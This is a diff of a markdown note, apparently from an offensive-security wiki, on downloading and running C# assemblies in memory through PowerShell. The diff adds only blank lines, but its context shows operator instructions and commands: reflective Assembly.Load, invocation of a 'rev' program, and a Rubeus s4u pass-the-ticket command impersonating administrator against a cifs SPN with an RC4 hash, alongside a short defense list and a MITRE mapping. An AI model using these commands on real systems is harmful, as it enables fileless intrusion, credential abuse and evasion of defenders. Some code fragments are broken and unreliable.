@@ -39,6 +39,8 @@ The technical explanation of this procedure is that we will use Powershell to lo
 
 The business value of this procedure is that it allows attackers to execute code in memory without leaving any trace on the file system. This makes it difficult for defenders to detect and respond to attacks, and can lead to data theft, system compromise, and other serious security incidents.
 
+ 
+
 ## Requirements
 
 1. Powershell access on the target system
@@ -46,6 +48,8 @@ The business value of this procedure is that it allows attackers to execute code
 1. Network access to download the assembly and DLL
 
 1. Knowledge of the assembly and its dependencies
+
+ 
 
 ## Defense
 
@@ -55,6 +59,8 @@ The business value of this procedure is that it allows attackers to execute code
 
 1. Implement endpoint detection and response (EDR) solutions to detect and respond to suspicious activity
 
+ 
+
 ## Objectives
 
 1. Download and execute a C# assembly and DLL reflectively
@@ -63,14 +69,24 @@ The business value of this procedure is that it allows attackers to execute code
 
 1. Execute code in memory without leaving a trace on the file system
 
+ 
+
 # Instructions
 
 1. To download and execute an assembly without arguments, copy the first command provided and replace the URL with the URL of the assembly you want to download and execute. To download and execute Rubeus with arguments, replace the URL with the URL of the Rubeus executable and replace the arguments within the parentheses with the arguments you want to use. Make sure to split the arguments. To execute a specific method from an assembly, replace the URL with the URL of the DLL and replace the class and method names within the parentheses with the appropriate names.
 
+ 
+
+
+
 **Code**: [[# Download and run assembly without arguments
 $dat]]
 
+
+
 > The provided commands can be used to download and execute assemblies and DLLs. The first command can be used to download and execute an assembly without arguments. The second command can be used to download and execute Rubeus with arguments. The third command can be used to execute a specific method from an assembly. The instructions provide details on how to modify the commands to download and execute the desired assemblies and DLLs.
+
+
 
 **Command** ([[Download and run assembly without arguments]]):
 
@@ -80,6 +96,10 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [rev.Program]::Main()
 ```
 
+
+
+
+
 **Command** ([[Download and run Rubeus with arguments]]):
 
 ```bash
@@ -87,6 +107,10 @@ $assem = [System.Reflection.Assembly]::Load($data)
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 ```
+
+
+
+
 
 **Command** ([[Execute a specific method from an assembly]]):
 
@@ -97,6 +121,8 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -124,3 +150,5 @@ $method.Invoke(0, $null)
 
 - [[Load C# assembly reflectively]]
 - [[Powershell]]
+
+
